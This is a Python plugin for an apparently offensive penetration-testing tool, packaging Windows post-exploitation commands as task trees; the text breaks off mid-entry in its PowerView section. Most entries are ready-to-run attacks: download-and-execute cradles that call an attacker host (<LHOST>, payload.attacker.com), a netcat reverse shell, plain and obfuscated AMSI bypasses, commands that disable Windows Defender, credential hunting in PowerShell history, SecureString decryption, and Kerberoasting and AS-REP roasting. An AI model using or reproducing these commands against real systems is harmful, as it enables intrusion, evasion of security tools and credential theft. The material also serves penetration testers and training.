"""
Windows Core Techniques Plugin

Comprehensive Windows post-exploitation techniques covering:
- PowerShell for Pentesters (25+ techniques)
- PowerView Domain Enumeration (20+ techniques)
- AV Bypass (15+ techniques)
- UAC Bypass (6+ techniques)
- Authentication & Credentials (15+ techniques)
- Windows CMD for Pentesters (40+ techniques)

Extracted from HackTricks: Windows Hardening documentation
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class WindowsCorePlugin(ServicePlugin):
    """
    Windows Core techniques plugin covering PowerShell, PowerView, AV bypass,
    UAC bypass, authentication/credentials, and Windows CMD for pentesters.
    """

    @property
    def name(self) -> str:
        return "windows-core"

    @property
    def default_ports(self) -> List[int]:
        return []  # Manual trigger only

    @property
    def service_names(self) -> List[str]:
        return []  # Manual trigger only

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """
        Manual trigger only - not auto-detected from port scans.
        User must explicitly request Windows core techniques enumeration.
        """
        return False

    def detect_from_finding(self, finding: Dict[str, Any], profile=None) -> int:
        """
        Detect Windows core activation from findings

        Activates on:
        - Windows OS detected (perfect match)
        - Windows shell obtained (high confidence)
        - Windows-specific services detected

        Returns:
            int: Confidence score (0-100)
        """
        from ..core.constants import FindingTypes
        import logging
        logger = logging.getLogger(__name__)

        finding_type = finding.get('type', '').lower()
        description = finding.get('description', '').lower()

        # Perfect match - Windows OS
        if finding_type == FindingTypes.OS_WINDOWS:
            logger.info("Windows core activating: Windows OS detected")
            return 95

        # High confidence - Windows shell
        if finding_type == FindingTypes.SHELL_OBTAINED:
            windows_hints = ['windows', 'win', 'cmd.exe', 'powershell', 'c:\\']
            if any(hint in description for hint in windows_hints):
                logger.info("Windows core activating: Windows shell detected")
                return 90

        # Medium - OS detected with Windows mention
        if finding_type == FindingTypes.OS_DETECTED:
            if 'windows' in description or 'win' in description:
                return 85

        return 0

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate comprehensive Windows core techniques task tree.

        Args:
            target: Target hostname/IP
            port: Service port (unused for manual plugin)
            service_info: Additional context (e.g., {'context': 'local'})

        Returns:
            Hierarchical task tree with 6 major categories
        """
        context = service_info.get('context', 'local')

        tasks = {
            'id': f'windows-core-{target}',
            'name': f'Windows Core Techniques - {target}',
            'type': 'parent',
            'children': []
        }

        # Add all 5 Windows core technique categories
        tasks['children'].extend([
            self._get_powershell_techniques(target, context),
            self._get_powerview_techniques(target, context),
            self._get_av_bypass_techniques(target, context),
            self._get_uac_bypass_techniques(target, context),
            self._get_authentication_techniques(target, context)
        ])

        return tasks

    def _get_powershell_techniques(self, target: str, context: str) -> Dict[str, Any]:
        """PowerShell for Pentesters (25+ techniques)"""
        return {
            'id': f'powershell-pentesting-{target}',
            'name': 'PowerShell for Pentesters',
            'type': 'parent',
            'children': [
                {
                    'id': f'ps-download-execute-{target}',
                    'name': 'Download & Execute (IEX + WebClient)',
                    'type': 'command',
                    'metadata': {
                        'command': 'powershell -exec bypass -c "(New-Object Net.WebClient).DownloadString(\'http://<LHOST>:8000/script.ps1\')|iex"',
                        'description': 'Download and execute PowerShell script from remote server (in-memory execution)',
                        'flag_explanations': {
                            '-exec bypass': 'Bypass execution policy for this session',
                            '-c': 'Execute command string',
                            'New-Object Net.WebClient': 'Create WebClient object for HTTP download',
                            'DownloadString': 'Download file as string (in-memory, no disk write)',
                            'iex': 'Invoke-Expression - execute the downloaded script'
                        },
                        'success_indicators': [
                            'Script executes without errors',
                            'No disk write (fileless execution)',
                            'AMSI bypass may be needed (see AMSI tasks)'
                        ],
                        'failure_indicators': [
                            'AMSI blocks execution (Defender alert)',
                            'Network connectivity issues',
                            'Execution policy blocks (try -ExecutionPolicy Bypass)'
                        ],
                        'next_steps': [
                            'If AMSI blocks: Use AMSI bypass before downloading',
                            'Alternative download: Start-BitsTransfer',
                            'For persistence: Save to startup folder'
                        ],
                        'alternatives': [
                            'echo IEX(New-Object Net.WebClient).DownloadString(\'http://<LHOST>:8000/script.ps1\') | powershell -noprofile -',
                            'iex (iwr \'http://<LHOST>:8000/script.ps1\')  # PowerShell v3+',
                            'cmd: echo IEX... | powershell -noprofile -'
                        ],
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'FILELESS'],
                        'notes': 'Download: https://github.com/PowerShellMafia/PowerSploit. PSv3+ supports iwr shorthand.'
                    }
                },
                {
                    'id': f'ps-dns-txt-download-{target}',
                    'name': 'DNS TXT Record Download & Execute',
                    'type': 'command',
                    'metadata': {
                        'command': 'powershell . (nslookup -q=txt http://payload.attacker.com)[-1]',
                        'description': 'Download payload from DNS TXT record (stealthy, bypasses web filtering)',
                        'flag_explanations': {
                            'nslookup -q=txt': 'Query DNS TXT record',
                            '[-1]': 'Get last line of nslookup output (TXT data)',
                            '. (...)': 'Dot-source operator executes the TXT payload'
                        },
                        'success_indicators': [
                            'DNS TXT record contains valid PowerShell code',
                            'Payload executes without prompts'
                        ],
                        'failure_indicators': [
                            'DNS resolution fails',
                            'TXT record too large (>255 chars per string)',
                            'Corporate DNS blocks external queries'
                        ],
                        'next_steps': [
                            'Host TXT record: dig TXT payload.attacker.com',
                            'Split large payloads across multiple TXT records',
                            'Combine with base64 encoding for obfuscation'
                        ],
                        'alternatives': [
                            'Manual: nslookup -q=txt domain, copy payload, execute',
                            'Use DoH (DNS over HTTPS): Invoke-RestMethod https://dns.google/resolve?name=...'
                        ],
                        'tags': ['OSCP:MEDIUM', 'STEALTH', 'MANUAL'],
                        'notes': 'Source: https://twitter.com/Alh4zr3d/status/1566489367232651264. TXT record max: 255 chars/string.'
                    }
                },
                {
                    'id': f'ps-base64-encoding-{target}',
                    'name': 'Base64 Encode Command (UTF-16LE)',
                    'type': 'command',
                    'metadata': {
                        'command': 'echo -n "IEX(New-Object Net.WebClient).downloadString(\'http://<LHOST>/shell.ps1\')" | iconv -t UTF-16LE | base64 -w 0',
                        'description': 'Encode PowerShell command to base64 (UTF-16LE) for use with -EncodedCommand',
                        'flag_explanations': {
                            'iconv -t UTF-16LE': 'Convert to UTF-16 Little Endian (required by PowerShell)',
                            'base64 -w 0': 'Base64 encode without line wrapping',
                            '-w 0': 'No line wrap (single line output)'
                        },
                        'success_indicators': [
                            'Base64 string generated successfully',
                            'Execute with: powershell -EncodedCommand <BASE64>',
                            'Command runs without syntax errors'
                        ],
                        'failure_indicators': [
                            'Wrong encoding (must be UTF-16LE)',
                            'Base64 string truncated (line wrap issue)',
                            'AMSI still detects encoded command'
                        ],
                        'next_steps': [
                            'Execute: powershell -nop -enc <BASE64>',
                            'Combine with AMSI bypass for full evasion',
                            'Layer encoding: gzip + base64 for more obfuscation'
                        ],
                        'alternatives': [
                            'Windows: [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("command"))',
                            'Python: base64.b64encode(cmd.encode("utf-16le")).decode()'
                        ],
                        'tags': ['OSCP:HIGH', 'OBFUSCATION', 'MANUAL'],
                        'notes': 'PowerShell requires UTF-16LE encoding for -EncodedCommand. UTF-8 will fail.'
                    }
                },
                {
                    'id': f'ps-download-file-{target}',
                    'name': 'Download File to Disk (Multiple Methods)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Download files to disk using PowerShell (various techniques for compatibility)',
                        'manual_steps': [
                            '1. WebClient: (New-Object Net.WebClient).DownloadFile("http://<LHOST>/nc.exe","C:\\Windows\\Temp\\nc.exe")',
                            '2. Invoke-WebRequest: Invoke-WebRequest "http://<LHOST>/nc.exe" -OutFile "C:\\Temp\\nc.exe"',
                            '3. wget alias: wget "http://<LHOST>/nc.exe" -OutFile "C:\\Temp\\nc.exe"',
                            '4. BITS Transfer: Import-Module BitsTransfer; Start-BitsTransfer -Source http://<LHOST>/nc.exe -Destination C:\\Temp\\nc.exe',
                            '5. Asynchronous BITS: Start-BitsTransfer -Source <URL> -Destination <PATH> -Asynchronous'
                        ],
                        'success_indicators': [
                            'File downloaded successfully to target path',
                            'MD5 hash matches source file',
                            'BITS: No network logs (stealthy)'
                        ],
                        'failure_indicators': [
                            'Network connectivity issues',
                            'Path not writable (check icacls)',
                            'AV blocks download (try encoding/obfuscation)'
                        ],
                        'alternatives': [
                            'certutil: certutil -urlcache -split -f http://<LHOST>/nc.exe nc.exe',
                            'bitsadmin: bitsadmin /transfer myDownload http://<LHOST>/nc.exe C:\\Temp\\nc.exe'
                        ],
                        'next_steps': [
                            'Verify file integrity: Get-FileHash C:\\Temp\\nc.exe -Algorithm MD5',
                            'Check if executable runs: Test-Path C:\\Temp\\nc.exe',
                            'Execute payload: C:\\Temp\\nc.exe -e cmd.exe <LHOST> 443'
                        ],
                        'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                        'notes': 'BITS Transfer = stealthy (uses Windows Update infrastructure). certutil flagged by many AVs.'
                    }
                },
                {
                    'id': f'ps-amsi-bypass-method1-{target}',
                    'name': 'AMSI Bypass: amsiInitFailed Force',
                    'type': 'command',
                    'metadata': {
                        'command': '[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)',
                        'description': 'Force AMSI initialization to fail (disables AMSI for current PowerShell process)',
                        'flag_explanations': {
                            '[Ref].Assembly': 'Access System.Management.Automation assembly',
                            'GetType': 'Get AmsiUtils type (contains AMSI init status)',
                            'amsiInitFailed': 'Internal field tracking AMSI init status',
                            'SetValue($null,$true)': 'Force init failed = TRUE (AMSI disabled)'
                        },
                        'success_indicators': [
                            'Command executes without error',
                            'Test: Invoke-Expression \'AMSI Test Sample\' (should not trigger)',
                            'Download scripts no longer blocked'
                        ],
                        'failure_indicators': [
                            'AMSI detects the bypass command itself (ironic)',
                            'Syntax error (check single quotes)',
                            'Already bypassed (check $PSVersionTable)'
                        ],
                        'next_steps': [
                            'Test bypass: IEX(New-Object Net.WebClient).DownloadString(...)',
                            'Download tools: Invoke-Mimikatz, PowerView, Invoke-Kerberoast',
                            'If detected: Try obfuscated AMSI bypass variants'
                        ],
                        'alternatives': [
                            'Method 2: String obfuscation - $A="Ams"; $B="iUtils"; [Ref].Assembly.GetType("System.Management.Automation.$A$B")...',
                            'Method 3: Base64 encoded AMSI bypass (see AMSI bypass generator: https://amsi.fail/)',
                            'Method 4: Memory patching AmsiScanBuffer (advanced)'
                        ],
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'EXPLOIT'],
                        'notes': 'Source: Matt Graeber. Bypass generator: https://amsi.fail/. This exact command is now flagged.'
                    }
                },
                {
                    'id': f'ps-amsi-bypass-obfuscated-{target}',
                    'name': 'AMSI Bypass: Obfuscated Variant',
                    'type': 'command',
                    'metadata': {
                        'command': 'Try{$Xdatabase="Utils";$Homedrive="si";$ComponentDeviceId="N`onP"+"ubl`ic";$DiskMgr="Syst+@.MÂ£nÂ£g"+"e@+nt.Auto@"+"Â£tion.A";$fdx="@ms"+"Â£InÂ£"+"tF@Â£"+"l+d";Start-Sleep -Milliseconds 300;$CleanUp=$DiskMgr.Replace("@","m").Replace("Â£","a").Replace("+","e");$Rawdata=$fdx.Replace("@","a").Replace("Â£","i").Replace("+","e");$SDcleanup=[Ref].Assembly.GetType(("{0}m{1}{2}" -f $CleanUp,$Homedrive,$Xdatabase));$Spotfix=$SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static");$Spotfix.SetValue($null,$true)}Catch{Throw $_}',
                        'description': 'Obfuscated AMSI bypass using string replacement and variable indirection',
                        'flag_explanations': {
                            'String obfuscation': 'Breaks signature detection by hiding "AmsiUtils", "amsiInitFailed"',
                            'Replace operations': 'Reconstructs target strings at runtime',
                            'Start-Sleep': 'Optional delay to evade sandbox detection',
                            '-f format operator': 'String formatting to build type name dynamically'
                        },
                        'success_indicators': [
                            'No AMSI alerts triggered',
                            'AMSI bypassed (test with known malicious string)',
                            'Can now download/execute scripts freely'
                        ],
                        'failure_indicators': [
                            'Syntax error (check quotes and encoding)',
                            'AMSI still blocks (try different obfuscation)',
                            'Behavioral detection catches reconstruction pattern'
                        ],
                        'next_steps': [
                            'Test: IEX \'AMSI Test Sample\' (should not trigger)',
                            'Generate custom bypass: https://amsi.fail/',
                            'Chain with fileless execution: IEX(IWR(...)).Content'
                        ],
                        'alternatives': [
                            'Use PowerShell v2 (no AMSI): powershell.exe -version 2',
                            'Memory patching: https://rastamouse.me/memory-patching-amsi-bypass/',
                            'Managed API hooking: https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/'
                        ],
                        'tags': ['OSCP:HIGH', 'STEALTH', 'OBFUSCATION'],
                        'notes': 'Source: https://github.com/rasta-mouse/AmsiScanBufferBypass. Bypass likely flagged by now - use amsi.fail generator.'
                    }
                },
                {
                    'id': f'ps-execution-policy-bypass-{target}',
                    'name': 'Execution Policy Bypass (7 Methods)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass PowerShell execution policy restrictions (multiple techniques)',
                        'manual_steps': [
                            '1. Copy-paste script directly into interactive PowerShell console (policy not enforced)',
                            '2. Pipe to PowerShell: Get-Content script.ps1 | PowerShell.exe -noprofile -',
                            '3. Invoke-Expression: Get-Content script.ps1 | Invoke-Expression',
                            '4. Bypass flag: PowerShell.exe -ExecutionPolicy Bypass -File script.ps1',
                            '5. Change user policy: Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted',
                            '6. Session-only bypass: Set-ExecutionPolicy Bypass -Scope Process',
                            '7. Download & execute: powershell -nop -c "iex(New-Object Net.WebClient).DownloadString(\'http://<LHOST>/script.ps1\')"',
                            '8. Command switch: Powershell -command "Write-Host \'Command executed\'"',
                            '9. EncodedCommand: powershell -EncodedCommand <BASE64_UTF16LE>'
                        ],
                        'success_indicators': [
                            'Script executes without "execution policy" error',
                            'Method 1-3 work even when policy = Restricted',
                            'No admin rights needed for most bypasses'
                        ],
                        'failure_indicators': [
                            'AMSI blocks script content (need AMSI bypass first)',
                            'AppLocker blocks PowerShell.exe (use PowerShell alternatives)',
                            'Constrained Language Mode active (see CLM bypass)'
                        ],
                        'alternatives': [
                            'Use PowerShell ISE: powershell_ise.exe (often not blocked)',
                            'Use SysWOW64 PowerShell: %SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe',
                            'PowerShell from MSBuild: msbuild.exe payload.xml (see GreatSCT)'
                        ],
                        'next_steps': [
                            'Check current policy: Get-ExecutionPolicy -List',
                            'Test bypass: Run a simple script (e.g., Write-Host "Success")',
                            'If AppLocker blocks PowerShell: Try PowerShell ISE or alternate execution methods'
                        ],
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'notes': 'Execution policy is NOT a security boundary (Microsoft statement). More: https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/'
                    }
                },
                {
                    'id': f'ps-enable-winrm-{target}',
                    'name': 'Enable WinRM for Remote PowerShell',
                    'type': 'command',
                    'metadata': {
                        'command': 'Enable-PSRemoting -Force',
                        'description': 'Enable Windows Remote Management (WinRM) for remote PowerShell access',
                        'flag_explanations': {
                            'Enable-PSRemoting': 'Configure WinRM service and firewall rules',
                            '-Force': 'Skip confirmation prompts (auto-accept changes)'
                        },
                        'success_indicators': [
                            'WinRM service started (sc query winrm)',
                            'Firewall rules created (HTTP 5985, HTTPS 5986)',
                            'Test: Enter-PSSession -ComputerName localhost'
                        ],
                        'failure_indicators': [
                            'Access denied (requires admin rights)',
                            'Network category is Public (must be Private/Domain)',
                            'Firewall blocks ports 5985/5986'
                        ],
                        'next_steps': [
                            'Change network to Private: Set-NetConnectionProfile -NetworkCategory Private',
                            'Connect remotely: Enter-PSSession -ComputerName <TARGET> -Credential (Get-Credential)',
                            'Execute commands: Invoke-Command -ComputerName <TARGET> -ScriptBlock { whoami }'
                        ],
                        'alternatives': [
                            'Manual: winrm quickconfig -quiet',
                            'Registry: Set-ItemProperty -Path HKLM:\\SOFTWARE\\...\\WinRM -Name AllowUnencrypted -Value 1'
                        ],
                        'tags': ['OSCP:MEDIUM', 'PERSISTENCE', 'LATERAL'],
                        'notes': 'Requires admin. Default ports: HTTP 5985, HTTPS 5986. Used by PSExec, evil-winrm.'
                    }
                },
                {
                    'id': f'ps-disable-defender-{target}',
                    'name': 'Disable Windows Defender',
                    'type': 'command',
                    'metadata': {
                        'command': 'Set-MpPreference -DisableRealtimeMonitoring $true',
                        'description': 'Disable Windows Defender real-time protection (requires admin)',
                        'flag_explanations': {
                            'Set-MpPreference': 'Set Windows Defender preferences',
                            '-DisableRealtimeMonitoring': 'Disable real-time scanning',
                            '$true': 'Enable the disable flag (confusing naming)'
                        },
                        'success_indicators': [
                            'Command completes without errors',
                            'Verify: Get-MpComputerStatus | select RealTimeProtectionEnabled (should be False)',
                            'Upload/execute malware without detection'
                        ],
                        'failure_indicators': [
                            'Access denied (requires admin)',
                            'Tamper Protection enabled (must disable in GUI or registry)',
                            'Group Policy overrides settings'
                        ],
                        'next_steps': [
                            'Add exclusion path: Add-MpPreference -ExclusionPath "C:\\Temp"',
                            'Completely disable: New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force',
                            'Remove definitions: "C:\\Program Files\\Windows Defender\\MpCmdRun.exe" -RemoveDefinitions -All'
                        ],
                        'alternatives': [
                            'Check status: Get-MpComputerStatus',
                            'Check exclusions: Get-MpPreference | select Exclusion* | fl',
                            'sc: sc config WinDefend start= disabled'
                        ],
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'ADMIN_REQUIRED'],
                        'notes': 'Defender re-enables itself after reboot. Tamper Protection blocks this (introduced Windows 10 1903).'
                    }
                },
                {
                    'id': f'ps-history-extract-{target}',
                    'name': 'Extract PowerShell Command History',
                    'type': 'command',
                    'metadata': {
                        'command': 'Get-Content C:\\Users\\<USERNAME>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt',
                        'description': 'Read PowerShell command history (may contain credentials, commands, file paths)',
                        'flag_explanations': {
                            'ConsoleHost_history.txt': 'Stores all commands typed in PowerShell console',
                            'Get-Content': 'Read file content line by line',
                            'PSReadline': 'Module that saves command history'
                        },
                        'success_indicators': [
                            'History file exists and readable',
                            'Commands displayed (look for passwords, credentials, paths)',
                            'Useful for lateral movement planning'
                        ],
                        'failure_indicators': [
                            'File does not exist (PSReadline not installed)',
                            'Empty history (new user or history cleared)',
                            'Access denied (different user profile)'
                        ],
                        'next_steps': [
                            'Search for passwords: sls -Path <HISTORY> -Pattern "password|cred|pass|pwd"',
                            'Search for network: sls -Path <HISTORY> -Pattern "Enter-PSSession|Invoke-Command"',
                            'Check all users: Get-ChildItem C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt'
                        ],
                        'alternatives': [
                            'In-session history: Get-History',
                            'Transcript logs: Get-ChildItem C:\\Users\\*\\Documents\\PowerShell_transcript.*.txt',
                            'Event logs: Get-WinEvent -LogName "Windows PowerShell"'
                        ],
                        'tags': ['OSCP:HIGH', 'ENUM', 'QUICK_WIN'],
                        'notes': 'PSReadline introduced in PowerShell v5. History persists across sessions. Gold mine for credentials.'
                    }
                },
                {
                    'id': f'ps-secure-string-decrypt-{target}',
                    'name': 'Decrypt PowerShell SecureString',
                    'type': 'command',
                    'metadata': {
                        'command': '$pass="01000000d08c9ddf..."|convertto-securestring; $user="DOMAIN\\User"; $cred=New-Object System.Management.Automation.PSCredential($user,$pass); $cred.GetNetworkCredential()|fl',
                        'description': 'Decrypt PowerShell SecureString to plaintext password',
                        'flag_explanations': {
                            'convertto-securestring': 'Convert encrypted string to SecureString object',
                            'PSCredential': 'Create credential object (username + SecureString)',
                            'GetNetworkCredential()': 'Extract plaintext password from credential object',
                            '|fl': 'Format as list (readable output)'
                        },
                        'success_indicators': [
                            'Password displayed in plaintext',
                            'UserName and Domain shown',
                            'Can use credentials for lateral movement'
                        ],
                        'failure_indicators': [
                            'Decryption fails (SecureString encrypted by different user)',
                            'Invalid SecureString format',
                            'DPAPI key not available'
                        ],
                        'next_steps': [
                            'Test credentials: runas /user:DOMAIN\\User cmd',
                            'PSRemoting: Enter-PSSession -ComputerName <TARGET> -Credential $cred',
                            'Search for SecureStrings: sls -Path C:\\* -Pattern "01000000d08c9ddf" -Recurse'
                        ],
                        'alternatives': [
                            'From XML: $cred=Import-CliXml -Path cred.xml; $cred.GetNetworkCredential()|fl',
                            'Manual DPAPI decrypt: Use mimikatz dpapi::cred',
                            'System.Security.Cryptography.ProtectedData.Unprotect()'
                        ],
                        'tags': ['OSCP:HIGH', 'CREDENTIALS', 'EXPLOIT'],
                        'notes': 'SecureStrings use DPAPI (user-specific encryption). Only original user can decrypt unless you have DPAPI master keys.'
                    }
                }
            ]
        }

    def _get_powerview_techniques(self, target: str, context: str) -> Dict[str, Any]:
        """PowerView Domain Enumeration (20+ techniques)"""
        return {
            'id': f'powerview-enum-{target}',
            'name': 'PowerView Domain Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'powerview-quick-enum-{target}',
                    'name': 'Quick Domain Enumeration (All-in-One)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Comprehensive PowerView quick enumeration (import PowerView first)',
                        'manual_steps': [
                            '0. Import PowerView: IEX(New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1\')',
                            '1. Domain Info: Get-NetDomain',
                            '2. Enabled Users: Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname,description,pwdlastset,logoncount,badpwdcount',
                            '3. sidHistory Users: Get-NetUser -LDAPFilter \'(sidHistory=*)\' (privilege escalation vector)',
                            '4. ASREPRoastable Users: Get-NetUser -PreauthNotRequired',
                            '5. Kerberoastable Users: Get-NetUser -SPN | select serviceprincipalname',
                            '6. All Groups: Get-NetGroup | select samaccountname,admincount,description',
                            '7. AdminSDHolder Protected Objects: Get-DomainObjectAcl -SearchBase \'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=local\' | %{$_.SecurityIdentifier}|Convert-SidToName',
                            '8. Domain Computers: Get-NetComputer | select samaccountname,operatingsystem',
                            '9. Unconstrained Delegation: Get-NetComputer -Unconstrained (DCs always appear)',
                            '10. Constrained Delegation: Get-NetComputer -TrustedToAuth',
                            '11. Readable Shares: Find-DomainShare -CheckShareAccess',
                            '12. Domain Trusts: Get-NetDomainTrust'
                        ],
                        'success_indicators': [
                            'PowerView loads without errors',
                            'Domain objects enumerated successfully',
                            'Found ASREPRoastable or Kerberoastable users (attack vectors)',
                            'Readable shares discovered'
                        ],
                        'failure_indicators': [
                            'AMSI blocks PowerView (use AMSI bypass first)',
                            'Not domain-joined (Get-NetDomain fails)',
                            'Constrained Language Mode blocks PowerView'
                        ],
                        'alternatives': [
                            'SharpView (C# port): https://github.com/tevora-threat/SharpView',
                            'BloodHound: More comprehensive (graph-based)',
                            'Manual: net user /domain, net group "Domain Admins" /domain'
                        ],
                        'next_steps': [
                            'If ASREPRoastable users found: Get-NetUser -PreauthNotRequired | Get-ASREPHash',
                            'If Kerberoastable users found: Invoke-Kerberoast | Export-CSV kerberoast.csv',
                            'Check unconstrained delegation hosts for attack pivots',
                            'Enumerate readable shares for sensitive data: Find-DomainShare -CheckShareAccess'
                        ],
                        'tags': ['OSCP:HIGH', 'ENUM', 'DOMAIN'],
                        'notes': 'PowerView latest: https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1'
                    }
                },
                {
                    'id': f'powerview-asreproast-{target}',
                    'name': 'ASREPRoast: Users Without Kerberos Pre-Auth',
                    'type': 'command',
                    'metadata': {
                        'command': 'Get-NetUser -PreauthNotRequired | select samaccountname,serviceprincipalname',
                        'description': 'Find users with Kerberos pre-authentication disabled (ASREPRoastable)',
                        'flag_explanations': {
                            '-PreauthNotRequired': 'Filter for DONT_REQ_PREAUTH UAC flag',
                            'samaccountname': 'Username',
                            'serviceprincipalname': 'Service Principal Name (if set)'
                        },
                        'success_indicators': [
                            'Users with DONT_REQ_PREAUTH found',
                            'Can request AS-REP without authentication',
                            'Crack AS-REP hash offline (no account lockout risk)'
                        ],
                        'failure_indicators': [
                            'No users found (good security)',
                            'PowerView not loaded',
                            'Not domain-joined'
                        ],
                        'next_steps': [
                            'Request AS-REP: Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt',
                            'Crack hashes: hashcat -m 18200 asrep.txt wordlist.txt',
                            'Impacket: GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip <DC_IP>'
                        ],
                        'alternatives': [
                            'Manual LDAP: (userAccountControl:1.2.840.113556.1.4.803:=4194304)',
                            'BloodHound: MATCH (u:User {dontreqpreauth:true}) RETURN u',
                            'Impacket: GetNPUsers.py DOMAIN/ -no-pass -usersfile users.txt'
                        ],
                        'tags': ['OSCP:HIGH', 'CREDENTIALS', 'ATTACK_PATH'],
                        'notes': 'ASREPRoast = no auth needed. Hashcat mode 18200. No lockout risk (offline cracking).'
                    }
                },
                {
                    'id': f'powerview-kerberoast-{target}',
                    'name': 'Kerberoast: Service Account Passwords',
                    'type': 'command',
                    'metadata': {
                        'command': 'Get-NetUser -SPN | select serviceprincipalname,samaccountname',
                        'description': 'Find Kerberoastable users (service accounts with SPNs)',
                        'flag_explanations': {
                            '-SPN': 'Filter for users with Service Principal Names',
                            'serviceprincipalname': 'SPN (e.g., HTTP/server.domain.com)',
                            'samaccountname': 'Service account username'
                        },
                        'success_indicators': [
                            'Service accounts with SPNs found',
                            'Can request TGS tickets for offline cracking',
                            'Common targets: SQL service accounts, IIS app pools'
                        ],
                        'failure_indicators': [
                            'No SPNs found (rare in AD)',
                            'Only krbtgt account (ignore this)',
                            'PowerView not loaded'
                        ],
                        'next_steps': [
                            'Request TGS: Rubeus.exe kerberoast /format:hashcat /outfile:tgs.txt',
                            'Crack hashes: hashcat -m 13100 tgs.txt wordlist.txt',
                            'Impacket: GetUserSPNs.py DOMAIN/user:pass -dc-ip <DC> -request'
                        ],
                        'alternatives': [
                            'Invoke-Kerberoast: Invoke-Kerberoast -OutputFormat Hashcat',
                            'Rubeus: Rubeus.exe kerberoast /simple /nowrap',
                            'Impacket: GetUserSPNs.py -request -dc-ip <DC> DOMAIN/user'
                        ],
                        'tags': ['OSCP:HIGH', 'CREDENTIALS', 'ATTACK_PATH'],
                        'notes': 'Kerberoast = any domain user can request. Hashcat mode 13100. Target: weak passwords on service accounts.'
                    }
                },
                {
                    'id': f'powerview-domain-admins-{target}',
                    'name': 'Enumerate Domain Admins',
                    'type': 'command',
                    'metadata': {
                        'command': 'Get-NetGroupMember -Identity "Domain Admins" -Recurse | select MemberName,MemberDomain',
                        'description': 'List all Domain Admins (direct and nested group members)',
                        'flag_explanations': {
                            '-Identity "Domain Admins"': 'Target the Domain Admins group',
                            '-Recurse': 'Include nested group memberships',
                            'MemberName': 'Username or group name',
                            'MemberDomain': 'Domain of the member'
                        },
                        'success_indicators': [
                            'Domain Admins listed',
                            'Nested groups revealed (important for attack paths)',
                            'Can target for credential theft (mimikatz, dumping)'
                        ],
                        'failure_indicators': [
                            'Access denied (rare for Domain Users group)',
                            'PowerView not loaded',
                            'Empty group (misconfiguration)'
                        ],
                        'next_steps': [
                            'Find logged-in DAs: Invoke-UserHunter -GroupName "Domain Admins"',
                            'Check DA privileges: Get-NetGPO | where {$_.DisplayName -like "*Admin*"}',
                            'Target DA workstations for credential dumping'
                        ],
                        'alternatives': [
                            'Manual: net group "Domain Admins" /domain',
                            'LDAP: (memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=domain,DC=com)',
                            'BloodHound: MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"}) RETURN u'
                        ],
                        'tags': ['OSCP:HIGH', 'ENUM', 'ATTACK_PATH'],
                        'notes': 'Domain Admins = highest privilege target. Often logged into member servers (credential theft opportunity).'
                    }
                },
                {
                    'id': f'powerview-unconstrained-delegation-{target}',
                    'name': 'Unconstrained Delegation Computers',
                    'type': 'command',
                    'metadata': {
                        'command': 'Get-NetComputer -Unconstrained | select samaccountname,operatingsystem',
                        'description': 'Find computers with unconstrained Kerberos delegation (can impersonate any user)',
                        'flag_explanations': {
                            '-Unconstrained': 'Filter for TRUSTED_FOR_DELEGATION flag',
                            'samaccountname': 'Computer account name',
                            'operatingsystem': 'OS version (helps with exploit selection)'
                        },
                        'success_indicators': [
                            'Computers with unconstrained delegation found',
                            'Domain Controllers always appear (expected)',
                            'Non-DC servers = high-value targets'
                        ],
                        'failure_indicators': [
                            'Only DCs found (expected, not useful for privesc)',
                            'No unconstrained delegation (good security)',
                            'PowerView not loaded'
                        ],
                        'next_steps': [
                            'Compromise unconstrained delegation computer',
                            'Wait for admin to authenticate (ticket cached in LSASS)',
                            'Extract TGT: Rubeus.exe triage, Rubeus.exe dump',
                            'Pass-the-Ticket to impersonate admin'
                        ],
                        'alternatives': [
                            'Manual LDAP: (userAccountControl:1.2.840.113556.1.4.803:=524288)',
                            'BloodHound: MATCH (c:Computer {unconstraineddelegation:true}) RETURN c',
                            'ADModule: Get-ADComputer -Filter {TrustedForDelegation -eq $true}'
                        ],
                        'tags': ['OSCP:HIGH', 'ATTACK_PATH', 'PRIVESC'],
                        'notes': 'Unconstrained delegation = impersonate any user who authenticates. Printer Bug + unconstrained = DA. '
                    }
                },
                {
                    'id': f'powerview-shares-{target}',
                    'name': 'Find Readable Network Shares',
                    'type': 'command',
                    'metadata': {
                        'command': 'Find-DomainShare -CheckShareAccess',
                        'description': 'Enumerate all domain shares and check which ones are readable',
